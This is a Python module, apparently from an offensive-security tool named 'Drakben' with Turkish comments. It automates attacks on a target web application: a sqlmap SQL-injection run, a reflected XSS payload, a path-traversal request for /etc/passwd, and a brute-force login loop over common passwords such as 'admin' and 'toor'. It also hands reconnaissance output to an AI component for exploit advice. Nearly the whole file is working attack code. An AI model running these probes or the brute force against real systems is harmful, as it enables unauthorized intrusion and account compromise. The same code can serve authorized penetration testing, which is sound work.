# modules/exploit.py
# Drakben Exploit Modülü - İleri Seviye

import subprocess
import requests
import asyncio
from modules import ai_bridge

# -------------------------
# SQL Injection (sqlmap)
# -------------------------
def run_sqlmap(target, param="id", level="1"):
    print(f"[Exploit] SQLmap başlatılıyor: {target}?{param}=1 (level={level})")

    cmd = [
        "sqlmap",
        "-u", f"{target}?{param}=1",
        "--batch",
        f"--level={level}"
    ]

    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        print("[Exploit] SQLmap çıktısı:")
        print(result.stdout)

        return {
            "type": "SQLi",
            "stdout": result.stdout,
            "stderr": result.stderr,
            "exit_code": result.returncode
        }

    except subprocess.TimeoutExpired:
        return {"type": "SQLi", "error": "SQLmap zaman aşımına uğradı."}
    except Exception as e:
        return {"type": "SQLi", "error": str(e)}

# -------------------------
# XSS Testi
# -------------------------
async def test_xss(target, param="q"):
    print(f"[Exploit] XSS testi: {target}?{param}=<script>alert(1)</script>")
    payload = "<script>alert(1)</script>"
    try:
        resp = requests.get(f"{target}?{param}={payload}", timeout=10)
        if payload in resp.text:
            return {"type": "XSS", "vulnerable": True, "payload": payload}
        else:
            return {"type": "XSS", "vulnerable": False}
    except Exception as e:
        return {"type": "XSS", "error": str(e)}

# -------------------------
# LFI Testi
# -------------------------
async def test_lfi(target, param="file"):
    print(f"[Exploit] LFI testi: {target}?{param}=../../etc/passwd")
    payload = "../../etc/passwd"
    try:
        resp = requests.get(f"{target}?{param}={payload}", timeout=10)
        if "root:" in resp.text:
            return {"type": "LFI", "vulnerable": True, "payload": payload}
        else:
            return {"type": "LFI", "vulnerable": False}
    except Exception as e:
        return {"type": "LFI", "error": str(e)}

# -------------------------
# Basit Auth Bypass
# -------------------------
async def brute_force_login(target, username="admin"):
    print(f"[Exploit] Basit brute force denemesi: {target}")
    passwords = ["admin", "123456", "password", "root", "toor"]
    for pwd in passwords:
        try:
            resp = requests.post(target, data={"username": username, "password": pwd}, timeout=10)
            if "dashboard" in resp.text.lower() or resp.status_code == 302:
                return {"type": "AuthBypass", "success": True, "username": username, "password": pwd}
        except Exception as e:
            return {"type": "AuthBypass", "error": str(e)}
    return {"type": "AuthBypass", "success": False}

# -------------------------
# AI Destekli Öneri
# -------------------------
async def ai_exploit_advice(recon_output):
    print("[Exploit] AI öneri motoru çalışıyor...")
    advice = await ai_bridge.analyze_exploit_output(recon_output)
    return {"type": "AI", "advice": advice}
